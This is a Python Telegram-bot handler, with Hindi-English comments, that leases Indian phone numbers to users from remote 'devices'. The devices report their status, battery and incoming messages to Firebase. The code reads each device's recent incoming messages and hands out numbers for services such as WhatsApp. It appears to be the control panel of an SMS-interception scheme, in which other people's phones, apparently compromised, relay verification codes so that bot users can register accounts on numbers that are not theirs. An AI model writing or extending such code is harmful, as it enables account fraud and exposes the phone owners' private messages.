# ... (Upar ka code same rahega, bas user_service function update karna hai)

@user_router.callback_query(F.data.startswith("user:service:"))
async def user_service(cq: CallbackQuery):
    await cq.answer()
    parts = cq.data.split(":")
    country, service = parts[2], parts[3]
    uid = cq.from_user.id
    clear_user_lease(uid)
    
    if service == "whatsapp":
        try: await cq.message.edit_text(f"⚡ {sc('fetching from database...')}\n<i>(Checking real-time status)</i>", parse_mode="HTML")
        except: pass
        
        d = db.load_data()
        ready = d.get("whatsapp_ready_lines", {})
        
        if not ready:
            return await cq.message.edit_text(
                "❌ <b>No fresh WhatsApp numbers available right now.</b>\n\n"
                "Background scanner abhi numbers dhundh raha hai. Kripya 1-2 minute baad try karein.",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("back", "user:get_num", "🔙")]]),
                parse_mode="HTML"
            )
            
        used = d.setdefault("used_devices", {}).setdefault(str(uid), {})
        now = int(time.time())
        
        # Shuffle to avoid giving same number every time
        available_lines = list(ready.items())
        random.shuffle(available_lines)
        
        valid_dev = None
        # Check real-time online status for top 5 random devices
        for dev_id, dev_data in available_lines[:5]:
            fb_url = dev_data["fb_url"]
            auth = dev_data.get("auth", "")
            
            # Check if device is currently online
            client_status = await fbu.fetch_fb(f"{fb_url}/clients/{dev_id}/status.json", auth)
            if client_status is True:
                valid_dev = (dev_id, dev_data)
                break
                
        if not valid_dev:
            return await cq.message.edit_text(
                "⚠️ <b>WhatsApp numbers offline hain.</b>\n\n"
                "Jo numbers available the wo abhi offline ho gaye hain. Kripya thodi der baad try karein.",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("back", "user:get_num", "🔙")]]),
                parse_mode="HTML"
            )

        dev_id, dev_data = valid_dev
        used[dev_id] = now
        data = db.load_data()
        data["used_devices"][str(uid)] = used
        
        chance = dev_data["chance"]
        fb_url = dev_data["fb_url"]
        fb_i = 1 
        base_label = "WA Server"
        real_battery = dev_data.get("battery", "0")
        real_health = dev_data.get("health", 5)
        msgs = []
        
    else:
        # ... (Baaki normal user ka same logic rahega)
        d = db.load_data()
        servers = get_servers_grouped(d, country)
        try: await cq.message.edit_text(f"🔄 {sc('fetching')} {service} {sc('lines')}...", parse_mode="HTML")
        except: pass
        
        used = d.setdefault("used_devices", {}).setdefault(str(uid), {})
        now = int(time.time())
        
        async def fetch_clients_data(fb):
            clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
            return fb, clients
            
        tasks = [fetch_clients_data(fb) for fb in servers[0]]
        results = await asyncio.gather(*tasks)
        
        valid_devices = []
        for fb_i_temp, (fb, clients) in enumerate(results):
            if not clients or not isinstance(clients, dict): continue
            for dev_id_temp, c in clients.items():
                if not isinstance(c, dict): continue
                is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 900) * 1000)
                if is_online:
                    msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id_temp}.json?orderBy=%22%24key%22&limitToLast=20", fb.get("auth"))
                    msgs_temp = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
                    valid_devices.append((fb_i_temp, fb, dev_id_temp, c, 97, msgs_temp))
        
        if not valid_devices:
            return await cq.message.edit_text("❌ No working lines found.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("back", "user:get_num", "🔙")]]))
            
        fb_i, fb, dev_id, dev_data, chance, msgs = random.choice(valid_devices)
        fb_url = fb['url']
        base_label = fb.get("label", f"Base {fb_i+1}")
        real_battery = str(dev_data.get("battery", "0")).replace("%", "")
        real_health = fbu.calculate_health(msgs)

    data = db.load_data()
    best_nums = [(dev_data.get("number", "Unknown"), dev_data.get("chance", 97))] if service == "whatsapp" else fbu.extract_best_numbers(dev_data, msgs)
    
    if not best_nums:
        backups = data.get("device_backups", {}).get(dev_id, {}).get("numbers", [])
        if backups:
            best_nums = [(n, "Backup") for n in backups]

    top_num = best_nums[0][0] if best_nums else "Unknown"
    
    data["user_leases"][str(uid)] = {
        "dev_id": dev_id, "fb_url": fb_url, "base_idx": base_label, "numbers": [n for n, c in best_nums],
        "expire_at": int(time.time()) + 3600, "health": real_health, "last_msg_id": 0, "top_number": top_num,
        "service_filter": service 
    }
    db.save_data(data)
    
    is_vip = uid in data.get("vip_users", []) or is_owner(uid)
    display_health = real_health if is_vip else 5 # Fake 10 hata diya
    
    nums_text = ""
    kb_nums = []
    if best_nums:
        for n, c in best_nums:
            conf_text = "Backup" if c == "Backup" else f"{c}%"
            nums_text += f"📞 <code>+91{n}</code> | {conf_text}\n"
            kb_nums.append([InlineKeyboardButton(text=f"Copy +91{n}", copy_text=CopyTextButton(text=f"+91{n}"))])
    else:
        nums_text = f"⚠️ <b>{sc('extracting number...')}</b>"
        
    text = (
        f"📱 <b>{sc('details')}</b>\n"
        f"🔥 {sc('srv')}: {base_label}\n"
        f"🆔 <code>{dev_id}</code> | ⚙️ {real_battery}T | ❤️ {display_health}/10\n"
        f"📊 {sc('chance')}: <b>{chance}%</b>\n\n"
        f"{nums_text}"
    )
    kb = kb_nums + [
        [btn("info", f"user:info:{dev_id}", "ℹ️"), btn("save number", f"user:save:{dev_id}", "⭐")],
        [btn("set timer", f"user:set_timer:{dev_id}", "⏰")], 
        [btn("next number", f"user:service:{country}:{service}", "🔄"), btn("stop", "user:stop", "⏹")],
        [btn("back", f"user:country:{country}", "🔙")]
    ]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except: pass
